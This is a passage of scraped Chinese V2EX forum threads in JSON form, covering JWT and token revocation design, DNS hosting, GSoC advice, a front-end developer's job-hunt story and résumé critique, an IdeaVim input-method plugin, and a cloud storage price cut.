"有的数据库是支持设置过期时间的， 1 和 2 一个意思。", "一般都是 token+用户名，在数据库中查询 token 对应的用户名。\r", "如果用户名和客户端发送的一致则继续正常的访问。\r", "如果不一致丢 401 错误。", "都不需要存，对用户 ID 和过期时间戳签名即可得到 token 。\r", "token 不应存私密的信息，所以不需要加密。而是要签名，防篡改。", "看 jwt 规范你就明白了。\r", "一般不需要存，但若要实现 revoke 之类就要存储", " 比如修改密码后，需要吊销之前的 token ，所以用户 ID 和过期时间戳之外，再加一个值，这个值可存在缓存中，每次请求先对 token 验证，通过后再拿缓存中的值与 token 中的比较", "登录成功后生成一个 token 存表存 redis 都行\r", "\r", "一个 token 对应一个 uid", "JWT ： Json web Token ，可以去了解一下", " \r", "\r", "这样的流程需要进行， 1 。解码 token ， 2 。验证 token ， 3 。把值与缓存比对。\r", "我认为不需要所谓的“值”，直接把 token 放到缓存中，利用 set 进行比对是很快的，都不需要解码和验证 token 。同时， token 一定要设定有效期，如一周，这样缓存中只需存最近一周内被 revoke 的 token ，在空间和时间上更合理。如果用户不喜欢每七天登录一次，可以在客户端设计一套自动 refresh token 的机制。", "直接用 session 吧 ,自己搞来搞去最后都搞成了 session", "一直很不理解 token 的使用场景。。。搞来搞去不就是个 session 么？\r", "完整实现了 http 协议的哪个不能支持 session ？还是因为懒", "2", " 主要是因为 session 依赖于 cookie 吧", "不用 JWT ， token 是这样的结构：签名后的字符串-用户 ID-指纹，共三段，每段中划线分隔.由于要谈到 token 吊销需要存储的问题，所以这里可以不需要存时间戳了。\r", "\r", "当注册 /登录成功后：\r", "1. 指定一个指纹，任意值都可以，只要这个值对这个用户没有使用过即可。\r", "2. 将指纹和用户 ID 拼起来并签名，组成 签名后的字符串-用户 ID-指纹 这样结构的 token 。\r", "3. 将用户 ID 与指纹对应起来放到缓存中，并且设置缓存过期时间，这个时间就是 token 有效期。\r", "4. 将 token 返回给客户端。\r", "\r", "当用户再次请求时：\r", "1. 将 token 中的用户 ID 和指纹再签名（通过服务端私钥），比对提交的 token 签名后的字符串 就可将篡改或伪造的 token 过滤掉了（或许这一步有更好的实现方式）。\r", "2. 过了上一步，仍然无法确定 token 是否已被吊销。获取缓存中的指纹与提交的 token 的指纹比对，若缓存中取不到指纹值(缓存已设置过有效期期)或缓存中的指纹与 token 的指纹值不相符，就说明这个 token 被吊销了。\r", "3. 通过了上面两步，表示这个请求是已认证了的。", " 忘了", "我是做了一个 cachegroup.\r", "前端 redis 热数据，后端 mysql 全部数据。\r", "\r", "另外， token 不是应该随机生成的吗？", "推荐楼上说的 JWT ，这种方式比较简单，如果应用安全级别不高很实用。客户端存一份 token ，存哪里都行，然后每次需要权限操作的时候就带着 token 去请求。后端接到请求的时候就验证一下。 JWT 把状态放在客户端，后台压力小，要是使用 session 还需要占用服务器资源。 session 多了还需要去管理 session", " \r", "\r", "Session 一般（除了 cookie based session ）就是基于 token 的一种具体实现啊。\r", "\r", "不就是把 token 存在对应的 cookie 里么……", "aes 加密用户 id ，过期时间 每次请求解密判断是否过期", "如果 jwt 也要存，不就变成 session 了么,后续又会遇到一对分布式 session 要处理的问题，这样好处在哪？求详细说明", " #23 jwt 在 local 本地存储，每次请求带过去，让 server 校验，不会存在分布式的问题", " 想把 JWT 作为 app 端和网页端登录凭证。那么 logout 的时候，一般也只是客户端删掉 JWT 吗？\r", "\r", "假如在 payload 里设置过期时间 60 秒，如何防止在 59 秒还可以成功请求， 61 秒就要求用户重新登录的情况呢？ JWT 有自带的机制去处理吗", "1 ， 2 看起来一样。 1 的话存的时候带过期时间呀。\r", "3 的话看起来不安全，通过逻辑生成总是有漏洞（/规律）", " #25 logout 时可以采用你说的删除 token ，另外 59 秒的问题，貌似没有解决办法，这一秒请求完了，下一秒再请求，它不就过期了嘛，对你的业务影响会很大吗？", " \r", "请教一个问题，假如我先打开网页 A ，这时候服务器在努力运算生成 token,但是出于某种原因卡住了。然后我又开了个新标签仍然打开网页 A, 然而这次服务端生成 token 后很快就返回了然后写入 cookie 成功了。然后前一次的 token 慢悠悠的返回了，把第二次的 token 覆盖掉了。这种情况该咋整", " jwt 的话没有影响 , token 合法就成了 , 因为服务器根本就没存 token.", " \r", "\r", "你的 token 是存在 cookie 的吗？\r", "\r", "这是标准的 session 啊。\r", "\r", "应该是最后一个 token 生效。", " 就是服务器用对称加密，将数据加密得到一个 string ，然后返回给 client, 每次 client 请求都带上这个 string, 服务器收到后解密，判断是否过期等....", "一般 app 端存 token 不会做短期的时间验证\r", "一般存在本地都会很长时间。", " 好的", " 对于这种场景， jwt 确实没有好的方式解决，这时候可以依赖服务端来做啊。", " 想知道有没有最佳实践", " 嗯，之前的做法是在记录一下心跳时间，导致服务端要记录。也许可以在快要过期时重新分配一个 token 更好", " 再去拿个 token ？一般来说除了 accesstoken 还会有 refreshtoken", "spring-session"]},
{"content": ["<div class=\"topic_content\">一个 14.5M 的 dat 文件，这个文件应该储藏是文本+图片的，在 windows 环境下如何打开呢？\r<br>\r<br>求大神指导</div>"], "reply": "4", "tittle": "求解， dat 格式的文件怎么打开？", "comment": ["16 进制编辑器", "UE", "文件格式是啥？\r", "\r", "用 file 命令看看。", "用 Binwalk 。\r", "或者十六进制编辑器，如果里面有东西的话，看一下文件头，拖出来就行。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>给客户在 godaddy 买的域名和虚拟主机 dns 不想用 godaddy dnspod 国际版不知为何访问极慢，求好的的国外 dns 最好是澳大利亚那边速度可观的</p>\n</div></div>"], "reply": "11", "tittle": "急！在 godaddy 买的域名和空间 国外 dns 域名解析服务 哪家强 针对澳大利亚用户？", "comment": ["为何不试试 cloudflare", "对了 免费的！！～～ 多谢各位", "google cloud\r", "aws route 53", "cloudflare", "Cloudflare", "Cloudflare 世界第一 DNS ，不考虑中国区的话。", "找澳大利亚本土的公司，肯定就快了。", "一般来说， dns 对于网站访问速度影响并不大。\r", "你 godday 主机是哪个节点的？ 美国还是亚洲？\r", "上 cdn ，，或者买澳洲的 vps", "推荐 ", " ，我一直在用，免费且稳定。", "Cloudflare 慢， godaddy 的空间不能用，", " 感觉被神化了。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>c 或者 java 的项目，我只会基础的，没有实际开发经验，我觉得选一个冷门的，应该有机会的。\nGSoc Google Summer of Code 谷歌编程之夏</p>\n</div></div>"], "reply": "10", "tittle": "有同学参加 GSoC 吗？我不知道选什么项目", "comment": ["有导师，你多试一下吧，很好的机会，还有 5000 美元", "现在申请时间估计已经晚了，熟悉项目的时间都没有，更不用说写 Proposal 了。事先需要对 Projects Idea 提交 Patch ，和 Mentor 讨论实现的细节。有很多申请者是直接实现一个原型之后提交 Proposal 的。\r", "\r", "Students Apply Deadline April 4, 2017 at 00:00 (CST)\r", "\r", "所以如果你能在最近三天里面熟悉一个项目，然后写一份能打动 Mentor 的 Proposal 的话，还是有可能申请上的。\r", "\r", "\r", " 今年中国地区只有 3500 刀。", " 我觉得确实是时间不够了，而且项目太多了我看到头晕。不过还是想抱着试试看的态度，所以我现在要做的是找到一个项目并且按他的要求给提交 patch ？我也许之能等到大四的时候才能实现它。\r", "我是它开放报名的时候才得知有这个项目的。在知乎上看到很多同学在寒假已经为项目做准备了。\r", "\r", "今年的奖金好像是 500+3600 ？", "苦逼穷大学生(|| ﾟДﾟ)好想去凑个热闹", " 我是没参加过，不过听过一位朋友分享他参加的经验，他是搞 wine 的，他当年是因为 wine 上面有他报的 200 个 issue 所以就进了。", "现在有些晚了 陶瓷交 PR 写 proposal 基本都结束了", "之前看了看那个类似 mc 的开源版本。。。不过最近没时间。。。而且有时间也不一定进去。。。遂暑假还是干点其他的吧。。。", "你赶紧开始 proposal 好好写， patch 什么过两天努力多交，多和 mentor 陶瓷。你还有十天时间，看你怎么发挥了。\r", "\r", "过来人，参加过两次，"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>以下内容在博客里刚刚发过一遍，由于实在是比较想吐糟，并且想听听大家的意见，于是在自己这博客上重新发一次，大家就当在看个故事好了（笑话？）</p>\n<p><strong>先简单介绍下个人经历</strong></p>\n<p>github 主页： <a href=\"https://github.com/jiangqizheng\" rel=\"nofollow\">https://github.com/jiangqizheng</a></p>\n<p>gui 上目前在写的项目， vue2 个人 demo ： <a href=\"https://github.com/jiangqizheng/vue-MiniQQ\" rel=\"nofollow\">https://github.com/jiangqizheng/vue-MiniQQ</a>\t顺便骗 Star</p>\n<p>楼主是毕业学生一枚（由于在校待过宣传部所以精通 ps ，曾兼职过修图，赚点外快...）学校大概就是所谓的野鸡学校，就多说了。</p>\n<p><strong>关于前端</strong></p>\n<ul>\n<li>入前端这个坑完全是由于个人兴趣(在此之前，我的兴趣一直是如何成为一名糕点师....)</li>\n<li>在 15 年左右暑期，闲来无事学习 PS 期间，对前端起了点兴趣，当时主要是看到别人 ps 里有个生成 css 的功能，当时感觉 css 好像很厉害的样子（目前为止，关于前端的确是 css 最难.....），然后就点开了 W3c ，开始了 html+css 的旅程，当时反正偶尔学学，直到能写一些简陋的静态页面的地步，之后由于沉迷游戏就没有怎么碰前端相关内容。</li>\n<li>然后到了 16 年初，当时想着自己作为一个有为青年，不能沉迷游戏，于是想起了曾经学过的 html+css ，于是又开始鼓捣，当时 html5+css3 正火，于是去学习了一遍，然后发现 js 是绕不过去的，于是开始入了 js 的坑，从此难以自拔。</li>\n<li>初学 js 时，学的红红火火恍恍惚惚，<strong>在有道云笔记上写了上百页的相关笔记</strong>（下面放点图），并且也学习了 jq</li>\n<li>花了个把月把 ES5 相关内容都过了好几遍后，就开始试着使用 bootstrap 等，一些常用的，大家推荐的 ui 框架，写了一些页面啥的。</li>\n<li>之后由于经常逛知乎，以及其他一些站点，突然发现好像自己赶不上潮流了，有个什么叫 node 的很火，当时对 node 还没什么印象，于是开始的 node 的学习之旅，由原生，转战至 express 框架（目前使用 koa2 ），也写了一些个人项目，例如仿微博啥的，学习 node 期间还把 mongodb 学习了一遍，并且把 python 教程过了一遍。</li>\n<li>之后有段时间突然对爬虫挺感兴趣，于是就试着用 node 写了一些爬虫(博客园，知乎)</li>\n<li>js 也学会了， node 也会写了，感觉好像世界完整了，然而逛逛 github ，突然发现别人的 js 为啥和我的 js 不太一样。它妹的，原来是是啥子叫做 ES6 的,还有 webapck ，以及 babel....于是开始入了 es6 的坑，不得不说， es6 相关语法 Class 和其他的，以及 es7 提供的 async 函数与对象解构真是好用...\nes6 也大概会了，然后顺其自然的就遇到了 MVVM 框架</li>\n<li>起初学习 react ，跟着教程走了一遍，自己也写了些小 demo ，但 jsx 写着不太舒服</li>\n<li>之后遇到了 vue2 ，框架精简，入手快，作者大大非常活跃并且是我们中国人，于是就入坑了。</li>\n</ul>\n<p><strong>关于面试</strong></p>\n<ul>\n<li>本着没有什么工作经验的想法，投了不少实习，工资 2000 的岗位，然而了无音讯。</li>\n<li>于是投递一些正常的初级前端，工资 3000-4000 的岗位，投了数百份，然而收到了 5 份面试邀请，其中 2 份是培训机构</li>\n<li>拿着得之不易的 3 份面试通知，想着要好好准备，于是找了不少相关资料充电。</li>\n<li>第一家，前台先是拿出一份 C++与 java 混编的试题....我一脸懵逼，因为真的不会，于是交了白卷，面试官看到我没写，一脸轻蔑的说，你这么简单的题都不会写吗？....于是结果不了了之。</li>\n<li>第二家，面试官上来就问，你会不会写 flash...放在网页里能动的那种....gg</li>\n<li>第三家，全程没有询问任何 js 相关的内容，问了不少 css ，以及兼容性....让我等通知....gg</li>\n</ul>\n<p><strong>疑惑</strong></p>\n<pre><code>究竟怎么样才能得到面试机会，或者说找到工作啊......难不成只能去培训过才能找到工作？\n自己靠兴趣学习的就不被认可吗？\n最近被找工作折腾的，好像有点怀疑自己是不是学了一两年假的前端。\n</code></pre>\n<p><strong>在之前的学习中一直都是单方面的输入，没有输入，所以在个人没有写什么能够证明自己水平的项目前，一直\t没有发过什么帖子，一来没什么好分享的内容，二来担心受到嘲讽（滑稽），于是就在找工作受挫之余自己撸了个较复杂的项目，希望恩能够体现自己的各方面，就在昨天项目完成了基本功能后，现在才敢发个帖吐个槽</strong></p>\n<p>一些图片....关于学习 js 时，看的一些书，看了大半，并没有看完....有的是当字典查询用。\n<img alt=\"\" src=\"http://images2015.cnblogs.com/blog/1030655/201703/1030655-20170328120938279-1863680469.jpg\"></p>\n<p>学习期间写的笔记\n<img alt=\"\" src=\"http://images2015.cnblogs.com/blog/1030655/201703/1030655-20170328121010373-1626720361.png\"></p>\n<p>作者 github 上目前在更新中的<code>Vue2</code>个人作品:<a href=\"https://github.com/jiangqizheng/vue-MiniQQ\" rel=\"nofollow\">https://github.com/jiangqizheng/vue-MiniQQ</a>\n欢迎 star ！</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>关于简历，既然很多朋友想看下我简历怎么写的，我这里就贴出来好了。\n另外，我的邮箱17826811002@163.com，希望大家推荐职位或者，帮忙对简历提点意见也行\n<img alt=\"\" src=\"http://images2015.cnblogs.com/blog/1030655/201703/1030655-20170328184657545-443472153.png\"></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><hr>\n<p><strong>昨天才发的帖子，能得到这么多人关注，楼主也没想到，于是默默潜水，发现了不少中肯的意见。</strong></p>\n<ul>\n<li>\n<p>看到评论里不少人说我太浮躁，我想吧，自己是浮躁了些，毕竟我只是一个20出头的年轻人，我还没学会沉稳，或者说，还没遇到足够大的挫折，这点我是认的，我的确浮躁了些。</p>\n</li>\n<li>\n<p>但是，你不能用我发的这个帖子来判定我浮躁....简单来说吧，我近期的经历是，先是面试碰壁，然后萌发了想要将一些自己掌握的东西用一个项目展示出来的想法，于是从零开始花了一周时间折腾出了目前的这个Vue2_miniQQ，在评论中，唯一不能接受的就是有人认为我项目是抄的，请自己对比下代码是否有雷同....，于是就在前天，刚写完基础的一些内容，就想到了在一些论坛上推广一下，骗点Star，为了弥补下工作经验的问题。</p>\n</li>\n<li>\n<p>在写项目推广的时候，想到了自己的一些学习经历，于是有感而发才顺手写了关于我自己的经历（真实内容），实在是有些嘈不吐不快，如果在百度或者谷歌上搜我的名字，相信这是唯一一篇我写的长篇吐槽，其他都是些关于技术问题的回答，所以说，起因只是为了宣传下我的个人小项目哈，标题只是用了夸张的修辞而已.....然而这篇文章火，当然，目的也达到了。</p>\n</li>\n<li>\n<p>另外交流的也欢迎加QQ：879567101 ，好些朋友，大佬都叫我多混混圈子，奈何前些时间一直蒙头学习，实在是对于圈子有点摸不着头脑，但是如果想交个朋友的尽管加QQ哈，来着不拒，不管是交流还是指出问题的。</p>\n</li>\n</ul>\n</div></div>"], "reply": "164", "tittle": "2 年前端学习历程，与找不到工作的悲愤与吐槽！（ 100%真实经历，看博主怎么一步步走向失业）", "comment": ["简历里这 4 个「懂」是大问题。一个企业要写着「懂」的人做什么？\r", "人家要的最少也是「熟悉」，有「精通」（真的精通，不是自己乱讲的那种」更好。\r", "\r", "还有这简历感觉很粗糙啊， jq 是什么？花 2 秒钟把「 jQuery 」拼写全都懒得做？", "至于排版混乱，字体样式不统一，内容没对齐，行高乱改，文字过于口语化之类的我就不多说了，你看着重写就好。\r", "这简历我拿到手里基本是秒删的……", "有点佩服楼主，加油。😂😂没理由这么惨，不过简历的确有点问题。", "说一点，学前端不代表可以不会 c++/java 之类的语言。 你都需要会啊", "怕麻烦就去前程无忧写个简历吧🌚", " #32 说的很对, 今年就不太想继续做前端了, 更新快也没有什么正经的的技术", "楼主自学能力超神，佩服，不过还是需要在面试和投简历上花费功夫", "我觉得你的问题可能出在简历上，你这个简历做的太粗糙啦！！", "1. 简历写得有问题。 显得楼主比较毛燥， 不能把握细节。 \r", "2. 楼主还未毕业，是无法签正式用人合同，先找实习岗吧。", "这个简历很有问题。", "没事放什么照片，你是金城武吗？是也不行。\r", "\r", "什么年代，用 word ? \r", "\r", "多去百度下，看看简历怎么写吧，更何况，学习时间满打满算根本没有 2 年。", "还没毕业就说失业。。。暴汗", "作为一个前端, 好歹把简历做专业一点吧.", "简历排版重新排一下，要大气一点，颜色要低调一些， logo 要大一点再大一点，名字小一点再小一点。。。，嗯 还是用原版吧。", "你这简历确实写的，不敢恭维啊，简历代表了别人对你的第一印象，不管你真实能力到底怎么样，看了这简历直接就被筛下去了。\r", "建议你好好优化一下简历吧，看看 STAR 法则，实在不行就去前程无忧按照人家的模板去写吧。", " 学习时间是没满两年，这不是四舍五入嘛", " 关于后端，我是了解了 php 和 python 的相关一些用到的接口， node 自己也在学，问题是 c++....这不是普通前端能用到的吧。", "我在广州认识的温州人，全部是做生意，这里居然还有写前端的。", "找不到很正常呀。\r", "你还没毕业。继续投简历。参加校园招聘\r", "其他人也说了简历排版挺垃圾\r", "你花 10 块钱，在五百丁上买个模板。\r", "好看很多。\r", "刚毕业在杭州上海，要 6K 。这样。\r", "工作不好找这是很正常的， HR 这关你都过不去。\r", "今年前端还算热的，等过半年，培训的兄弟就出来了。。\r", "和现在的移动开发一样了。", "说精通 PS ，又说学了一堆前端，然而简历不管是内容还是样式，都渣到爆。\r", "\r", "建议：去抄（是抄，不是模仿，不是参考，就是复制粘贴，再改下对应的文字内容）份别人的简历吧\r", "\r", "点评：过度缺乏实际社会工作经验，随便找个实习岗位先历练下吧，端盘子都行。观察下，打工的人都是怎样活着的", "找工作嘛不要玻璃心， LZ 学历水平比较低（这么说不会介意吧）这是事实， HR 看到学历一栏自然竞争力少了很多，没办法给你好的岗位让你去笔试和面试。\r", "\r", "诶，如果你是 HR ，你面对了一堆人，你怎么想？看了一下 LZ 所谓的“学习资料”，这些个“ if 怎么用啊”这种问题就……不要写给别人看了吧……你是 HR ，你看了无数人的简历，无数牛逼吹上天的东西，然后到您这一看简历格式，（上面各位吐槽过了我就不说了），学历大专，学习笔记是“ if 怎么用”，学校工作是海报宣传（有作品吗？简笔画也是海报宣传）\r", "\r", "最后，你看我们喷了这么多，不要玻璃心。有点阿 Q 精神是好的，喷我的都是 SB 。加油", " \r", "没事喷你干啥，反正你讲的也都是事实，话说，看了挺多人的评论，我还是觉得果然是我简历有大问题啊，其实主要这篇文是，宣传下项目，骗点 Star ，吐糟自己的经历只是，突然有感而发就写了这么多。。。。", "网络上简历是第一门面，一定要重视！\r", "我当年是投一个岗位一版简历（不能嫌麻烦）。", " \r", "看来不是你投的公司不对，就是学历影响到了， 既然这样就尽量在简历中删除无关重要的东西，重点突出你的强项喝目前的工作~", "js 前端这几年很火的呀, 我这种一直做原生开发的，都学 js 做  react native 了.", "这简历太糙了。。。 写个简历还那么多口头语言和简写，你也真够懒的。。", "浙江科技学院好像不是大专啊。", "搞前端的，简历做的漂亮一点行不？ 审美总要有的", "关于前端的确是 css 最难\r", "\r", "看到这句就很好奇， LZ 的 js 功底到底如何。。", "讲真，前端 css 不太行真说不过去。", "你这是两年经验么...你这种经验，别人不认的。加上今年前端本来就不好混，你的简历又写成这样，找不到工作也是正常情况，浪费了这么好的 github 。好好改改简历吧，另外少投工资低的，越是工资低的那种公司越认经验，你的 github 一点用都没有，反倒是工资高的公司会喜欢 github blog 这种东西。", "看错了，原来是两年学习，吓得我以为两年经验都找不到工作了，今年没有经验的确实不好找，但是也不应该是就 5 个面试，反正我是一个多星期接近两个星期有十几个面试，也才一年多而已。", "看前面的时候：担忧，前端现在真的这么不景气么，感觉 PO 知识储备和实践好像都还可以啊，仓库虽然项目不多但是 star 也不少啊向 PO 学习……（我可能是被 star 蒙蔽了双眼）\r", "\r", "看到简历的时候：哦……\r", "\r", "PO 你需要先改一下简历，真的……而且可以试试大公司，不要低估自己，有实力的话一定要争取各种面试机会……", "水平一般。", " \r", "所以起初才想着找实习类型的嘛，或者工资三四千的，并没有认为自己水平高。", "\r", "\r", "明显这个项目更好看，你的简历说实话，应该传不到 HR 经理那里，下面的小罗罗就可以筛掉。", "说了那么多一堆 “我多努力 我多努力” 那么最终 LZ 的水平有多少呢~\r", "少点浮躁 多点踏踏实实\r", "而且说实话 大专这个学历既是现在不是你的障碍\r", "以后也一定会成为你职业生涯的大障碍的如果你要走这条路", " \r", "我水平的确不高，而且会的东西太杂，全文只是简单的阐述了下学习经历，顺便吐槽。\r", "这么说吧，我的水平大概就是，给出任务，能够实现，但是在兼容性或者，优化上还又很大的欠缺，的这种地步。\r", "所以我对于找的工作，偏向于实习类的，希望能够把工作中需要用到的基础知识多学一些，毕竟我唯一自信点的就是学习能力。", "小公司招人难，也不一定给不起工资\r", "找工作，年轻人，不一定去大招聘网站\r", "俺这样工作 20 几年的，找工作才是麻烦呢\r", "呵呵", "浙江温州,浙江温州 江南...\r", "\r", "我擦,不好意思意思放错 BGM 了 .....", " 大佬，你好。", "不知道为什么，周围人现在看到 github 写一个完整的 app 项目 star 很高的简历完全提不起兴致。感觉现在 vue 已经变成当初 jQuery 那样了，同质化太严重", "公司招聘还是会看一些有特点的东西，以及视野的广度和学习能力。后者有些抽象。如果是应届生，很少关注能给公司带来什么立竿见影的效果", "浮", " 大佬求指条明路", "楼主的简历真是太粗糙了，而且格式太乱，先找个好模板再说", "讲真，不是女的。。不要在简历带照片。。。。。", "近期刚好我们有前端招聘计划，刚刚想加一下你 QQ 时你加好友设置的问题居然是“你多大啦？”？？？这 QQ 既然留给了潜在的用人单位，最好别设置这么奇怪的问题。", "简历太糟 +1\r", "感觉基本看不出什么亮点，学校和实习经历都不是很出众这算减分项吧。。。至于这个 github 上这个 demo 还不错，但是没部署到公网服务器上不给个真实的预览效果，很难说服 HR 啊。。。\r", "要我说你干脆别写学校信息和那个奇怪的实习经历了。多谈点技术方面的东西，你会的，你读过的书。项目在实现中的亮点，我看了下你的代码，算我见过的比较整齐的，具体的逻辑和实现没怎么看。", "已经很牛了，天才少年", "我公司有技术博客包装团队，个人技术博客建站服务，文章保证专业度和深度。同时提供专业代刷 Github 账号服务，一年全绿 1500 元，二年全绿 2500 元，源码质量保证。祝您互联网求职一帆风顺～", " 老哥稳", " 已经修改", "简历难看, 我是 HR 绝对 PASS 掉...真的", "还没毕业就达到这样的程度，已经很厉害了", "简历留白太多啦，本该塞进很多信息的\r", "照片别放，又不是前台，长得怎样谁管\r", "少写技能多写经历\r", "技能只写关键字就行，对付自动筛选\r", "经验才是大多数公司看重的，有多少能力只看做出什么成果\r", "还有宣传部什么的，和前端有关系么？\r", "用 PS 的经历，和前端有关系么？", "找不到工作，这种问题，首先自我归因一下吧，别急着找外部原因，解决复杂问题不妨先参考一下成功案例吧。我想你周围同学肯定有比你优秀，比你简历写得好，比你先找到工作的，你不妨看看他们是怎么做到的？", "简历里面一方面是学历问题。这个不展开讲了，已经是事实了。另一方面，你的项目描述大部分都还是停留在工具使用和使用一些胶水代码整合功能，你能不能多写下自己做的改进？实现了哪些创新？能不能多体现点你对原生 JS 的领悟？\r", "\r", "我觉得懂前端框架和工具的人一抓一大把，但并不是所有人都会改进和创新。很多人都还只是停留在初级阶段。这个行业更迭太快了，越是这样越要把基础打好。否则根本没有市场竞争力的。", " \r", "书到用时方恨少，软件编程，经验是累积出来的\r", "招聘，要先有面试机会，简历乱点不要紧，认真写，详细一些\r", "多投递", "m", "再提醒一点，在招聘网站上面按照格式填写简历好过 word 文档简历。现在的 HR 都是直接在网站上面多条件查询，没有多少人有耐心一个一个 word 简历打开看的。\r", "\r", "这个应该是关键。", "我很佩服你们这些短时间内就掌握了前端全家桶的人，不过简历实在是太丑了...", " 哈哈，我看到 github 觉得我这种找到工作的比不过楼主。。。看到简历。。。懂了", "0.我乱看了一下 Github ，感觉挺好的。\r", "\r", "1.楼主，简历，立刻改。先别写代码了，花 2~5 小时，写简历。\r", "\r", "2.想办法突出你的优势， github 的那些项目可以把相关的技术写上去（ vue+node+express+.....）这样。而且可以详细展开。写一个简单的介绍\r", "\r", "3.和前端不相关的往后面放。\r", "\r", "4.不要说“懂”，我感觉我理解你这个用词，希望公司能看到你的真诚。但是，真的不够优雅。可以说---- 有经验： JavaScript, jQuery, CSS, HTML, 这类的。写的时候不要酷炫的 js jq ，至少让人看着舒服一点。\r", "\r", "5.Github 的那些可以就买个主机展示，直接就让大家看到效果。\r", "\r", "6.找内推", "讲真，简历写的确实没假话。。但很难做到吸引人。如果你能突出一下项目的亮点可能会更好。另外，一行写完技术栈的做法要不得，虽然确实好像可以一行写完。按照类别分一下，分别列出来会更好。还有，最好采用官方的拼写方式。比如 Node.js ， MongoDB ， React"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前发过一个<a href=\"https://www.v2ex.com/t/351156\" rel=\"nofollow\">帖子</a>咨询大家的处理经验.\n之后搜索网上一些资料,最终通过参照<a href=\"https://github.com/ybian/smartim\" rel=\"nofollow\">smartim</a>写了个插件,初步解决该问题.</p>\n<p>安装后在编辑器中输入\":set switch-to-english-when-exit-insert-mode\",这个把这个命令加入到~/.ideavimrc 中,即可启用该功能.</p>\n<p>目前只能支持 macOS 因为不会写 LInux/Windows 的 Native 代码,希望有兴趣的朋友可以帮忙补充.</p>\n<p>有需要的朋友可以下载安装,多提意见.</p>\n<p><a href=\"https://pan.baidu.com/s/1nuMXnIx\" rel=\"nofollow\">https://pan.baidu.com/s/1nuMXnIx</a></p>\n<p>注意该插件依赖 IdeaVim 需要先安装 IdeaVim,毕竟是作为它的扩展存在的,如果不用 IdeaVim 那么我的插件也没什么用.</p>\n</div></div>", "<div class=\"topic_content\">昨晚发布的插件有 NPE 问题.\r<br>请更新一下\r<br><a target=\"_blank\" href=\"https://pan.baidu.com/s/1qXQUVz2\" rel=\"nofollow\">https://pan.baidu.com/s/1qXQUVz2</a></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>插件已整理发布到<a href=\"https://github.com/hadix-lin/ideavim_extension\" rel=\"nofollow\">GitHub</a></p>\n<p><a href=\"https://github.com/hadix-lin/ideavim_extension\" rel=\"nofollow\">https://github.com/hadix-lin/ideavim_extension</a></p>\n<p>欢迎大家提意见和需求.</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>增加了回到插入模式恢复之前的输入法的能力,详情查看<a href=\"https://github.com/hadix-lin/ideavim_extension\" rel=\"nofollow\">GitHub</a></p>\n</div></div>"], "reply": "20", "tittle": "在 IdeaVim 中退出插入模式后自动切换输入法为英文", "comment": ["马克下", "Mark", "厉害", "已测试好用.\r", "要是直接能切换到当前输入法的英文模式就更好了(类似于按了 shift 键)", "mark", "太感谢了，这个问题逼疯我。", "好用。。\r", "要是切走以后能再切回来就好了，或者像 @", " 说的那样，按 shift 就好了", " 我也想这样,如果输入法提供外部接口,也是可以做到这样的.", " 下次更新加上保存输入发状态的功能,回到插入模式后切回来.敬请期待.", " 如果直接系统级模拟 shift 按键是不是就能实现了？ github 开源吧，这样更新了还能接到 notify~", " 我是做 Java 的不了解也不会写操作系统 API,如果有人能贡献本地动态库的话,就可以做了.\r", "\r", "晚点儿代码整理好了,会放到 github 上.", "我在 Windows 下有相同的实现，通过 libcall", " 我不会写 windows 代码，我把头文件给你，可以帮忙写个 windows 的实现吗？", "这个为啥不放到 github 上呢", " 代码整理好会放在上面", "这里有一个已经写好的\r", "我用 ctrl+I 作为切换输入发的方式。这样会到导致无效吗？我 10.12.4 ， PHPStrom 2017.1", " 跟快捷键设置无关，只是调用 macOS 的系统 api 把输入法切换到美国英文键盘", "👍", "mark for github"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看到 webpack 官网的代码配色感觉很喜欢，又没有找到现成比较类似的，于是在 Darluca 主题上加以修改，感觉是有一点性冷淡风格。。。。。。</p>\n<p>连接：<a href=\"https://github.com/guoliim/color-scheme\" rel=\"nofollow\">color-scheme</a></p>\n</div></div>"], "reply": "6", "tittle": "类似于 webpack 官网的代码配色", "comment": ["你确信这不是 github 默认的。。。？", " 唉，不是吧，没有注意到...", "你说的 webpack1.x 还是 2.x ?", "WebStorm 的 配色", " 2.x", " 确实."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>虽然今天是愚人节，但是这个是真的！\n七牛云存储发布<a href=\"http://blog.qiniu.com/archives/8365\" rel=\"nofollow\">降价</a>信息，最新价格将在今天正式生效。</p>\n<p><img alt=\"\" src=\"https://cf.qiniu.io/download/attachments/17631627/edm.jpg?version=1&amp;modificationDate=1490161526000&amp;api=v2\"></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"http://wx3.sinaimg.cn/large/9e0444ddgy1fe6x5j8705j20fk078mzh.jpg\"></p>\n</div></div>"], "reply": "22", "tittle": "七牛云对象存储降价了，降幅近 13%", "comment": ["虽然今天是愚人节 但是你的图片还是显示不出来[doge]", "打开的好像是你们公司的 Wiki 吧。。。", "wordpress 如何设置融合云啊。。。直接把我的后台都缓存了。", "个人免费用户路过……\r", "你们的服务很好", "不够多！ HTTPS 要免费。", " 打开的是博客，可以点击 ", " 查看详情~", " 我指的是图片的链接", "看成了：云对象", "然而找不到对象", "价格还是可以，因为域名要备案公司就没用了", " 你没看错啊", " 手机上打开 ", " 会转到 ", " ，点击价格表 ", " 看不到 cdn 的价格。还有 ", " 能不能也用 https 呢？", "纯精神支持。", "https 有免费流量就好了。", " \r", " \r", "又拍云听说 HTTP2/HTTPS 都有免费基础流量了，不过我懒得去看了，感兴趣可以注册一下求证。", "改个 CDN 配置,提示说要 1 星期才生效,其他不能操作其他.这是七牛...", "upyun 的存储是 0.0043 元 /GB 。。\r", "你这个降价不够给力啊。。", "换成月的话是 0.129 元 /月 /G", "腾讯云对象存储 50G 免费，七牛只有 10G 免费。。。又拍是多少我一直没搞明白。。", "七牛存 1T 是 145/月 又拍是 129/月 腾讯 126 阿里 138", "网易蜂巢 113/月", "cdn 操作速度是硬伤"]},
